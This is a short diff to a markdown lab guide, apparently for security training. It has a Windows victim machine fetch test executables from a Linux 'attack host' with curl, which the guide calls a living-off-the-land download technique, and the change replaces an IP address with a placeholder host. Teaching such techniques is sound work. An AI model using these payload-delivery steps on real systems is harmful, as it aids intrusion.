@@ -22,7 +22,7 @@
 - Is firefox installed? (If not, launch a command prompt and run `choco install firefox`)
 2. Open a command prompt by clicking the search icon in the bottom left and typing `cmd`. The 
 4. Run the following command with my new favorite living off the land binary for dowloading remote files. 
-`curl http://172.31.24.<last octet of your linux attack host>:8000/test1.exe -o test1.exe`
+`curl http://<NIX-ATTACK-HOST>:8000/test1.exe -o test1.exe`
 5. Once you have this worked out, download all the files you created on the linux attack host just changing the file names.
   - test1.exe
   - test264.exe
